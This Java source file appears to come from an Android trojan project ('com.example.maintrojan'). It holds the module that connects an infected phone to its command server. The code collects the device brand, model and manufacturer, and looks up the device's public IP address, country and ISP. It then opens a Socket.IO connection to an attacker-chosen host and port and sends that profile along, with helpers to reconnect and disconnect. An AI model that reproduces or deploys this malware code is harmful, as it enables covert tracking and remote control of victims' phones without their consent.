package com.example.maintrojan;

import android.app.Activity;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Connecting {
    private static String TAG = "myTrojan";
    private static Socket sock = null;
    private static IO.Options opts = new IO.Options();
    private static JSONObject info = null;
    private static boolean CONNECTED = false;
    static OkHttpClient client = new OkHttpClient();

    static Request request = new Request.Builder()
            .url("http://ip-api.com/json/")
            .build();

    public static void connect(String host,String port,long reTime) throws InterruptedException {
            Thread t1 = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Default info
                    info = new JSONObject();
                    info.put("Country", "Unknown");
                    info.put("ISP", "Unknown");
                    info.put("IP", "Unknown");
                    info.put("Brand", Build.BRAND);
                    info.put("Model", Build.MODEL);
                    info.put("Manufacture", Build.MANUFACTURER);

                    try {
                        Response response = client.newCall(request).execute();
                        if(response.isSuccessful()){
                            JSONObject data = new JSONObject(response.body().string());
                            info.put("Country",data.getString("country"));
                            info.put("ISP",data.getString("isp"));
                            info.put("IP",data.getString("query"));
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "IP API failed: " + e.getMessage());
                    }
                    
                    Log.d(TAG, "onResponse: "+info.toString());

                    // making connection
                    opts.query = "info="+info.toString();
                    sock = IO.socket("http://"+host+":"+port,opts);
                    sock.connect();
                    CONNECTED = true;

                } catch (URISyntaxException | JSONException e) {
                    e.printStackTrace();
                    CONNECTED = false;
                    Log.d(TAG, "Connection failed: "+e.getMessage());
                }
            }
        });
        t1.start();
        t1.join();
    }
    public static Socket getSock(){
        return sock;
    }
    public static void connect(){
        sock.connect();
        CONNECTED = true;
        Log.d(TAG, "connected Again socket");
    }
    public static void disconnect(){
        sock.disconnect();
        CONNECTED = false;
        Log.d(TAG, "Disconnected socket");
    }
}
